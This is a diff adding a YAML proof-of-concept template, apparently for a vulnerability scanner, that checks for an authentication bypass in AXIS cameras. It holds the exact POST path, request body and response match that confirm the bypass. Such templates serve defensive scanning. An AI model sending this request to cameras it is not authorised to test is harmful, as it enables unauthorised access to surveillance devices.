@@ -1,0 +1,16 @@
+id: poc-yaml-axis-camera-authorization-bypass
+info:
+  name: AXIS 摄像头认证绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: Axis Camera
+  description: Axis 摄像头中存在一处认证绕过漏洞，攻击者可以通过发送包含特定数据的 HTTP 请求来绕过身份验证。
+  osprey-id: vb_2018_0025
+requests:
+- method: POST
+  path: /index.html/a.srv
+  data: actoin=abc&return_page=it_worked
+  expression: contains(body, "Continue to <a href=\"it_worked\">it_worked</a>")
+variables: {}
+transport: http
